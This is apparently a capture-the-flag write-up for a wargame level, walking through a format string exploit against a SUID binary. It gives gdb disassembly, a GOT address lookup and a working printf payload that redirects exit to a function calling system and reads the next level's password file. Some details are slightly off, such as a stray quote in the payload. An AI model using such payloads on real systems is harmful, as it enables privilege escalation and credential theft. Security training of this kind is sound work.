# Level 5

## First clue
- once logged in as level5 we find again an executable with the same behavior of ./level4, `level5` owned by `level6` and the SUID (SET USER ID) bit set(indicated by the s in place of the execute permission for the owner (rws)) that means that when anyone execute the file it will run with the privileges of level5, not the person executing it
- we try to execute it without arguments and we get the prompt back
- if we write something, that something is copied back as output

## Inspect with gdb
- The binary contains printf, fgets, system, external functions used for input/output operations and executing commands, indicating potential interaction with the user and system.
```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb)


```
- there are three main functions, `main`, `o` and `n`
- first we inspect main
## Main
```
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    

```
- main is simple, makes a stack alignment and call function `n`, as in level4
## Function n

```
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>

```
- allocates 0x218 = 536 bytes
- reads input from user using fgets, storing input in buffer at 0x208(%ebp)
- it calls printf function (that is at address 0x8048380) with as argument the user input retrieved with fget and stored in 0x208 
- it exits wihout returning
## Function o
```
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt> 
End of assembler dump.

```
- prepares the stack frame
- allocates 24 bytes (0x18 in hexa)
- the movl $0x80485f0, (%esp) instruction prepares an argument to be passed to the system function. It's placing the address 0x80485f0 onto the stack, which will serve as the argument to the system function call.
- The call 0x80483b0 <system@plt> instruction then calls the system function, passing the address 0x80485f0 as its argument. This means that the system function will execute the command specified at the memory address 0x80485f0.

## Vulnerability
- in function n the user input is not properly sanitized before being passed to the printf function, so we still have a control string vulnerability, but unlike in level4 we don't have a return and the system call is in function o, that is not called anywhere. So we can construct a controlled string that allows us to replace the address of exit in the GOT with the address of "o", so that when function n exit, "o" is called instead.


## Finding the address of exit in GOT (Global Offset Table), that is writeable
- ` objdump -R level5`
```
level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main


```
- we got th address: 08049838

## Finding at what position the exit functin address passed as argument to printf will be stored in the stack: 


`python -c 'print "aaaa" + " %x" * 10' | ./level5`
- we got: `aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078` => exit will be at 4th position

## Finding the address of function o
```
(gdb) info function o
All functions matching regular expression "o":

Non-debugging symbols:
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x08048420  __do_global_dtors_aux
0x080484a4  o
0x080485a0  __do_global_ctors_aux
```
- the addreess of o function that we want the exit point to allowing us to execute the shell command is 0x080484a4

## Building the exploit: 

`python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n""' | ./level5`

- \x38\x98\x04\x08 represents the address of the exit function in little-endian format.
- %134513824d specifies a large number of characters to print before %n is executed. 134513824 is the decimal representation of the little-endian address 0x080484a4, which is the address of the "o" function
- %4$n tells printf to write the count of characters printed so far to the memory address specified by the fourth argument, that is the exit function address
- so  we're effectively overwriting the address of exit in the Global Offset Table (GOT) with the address of the o function


## Triggering System Call
Once executed the exploit 134513824 chr are printed and then we can cat the /level6/.pass containing the flag
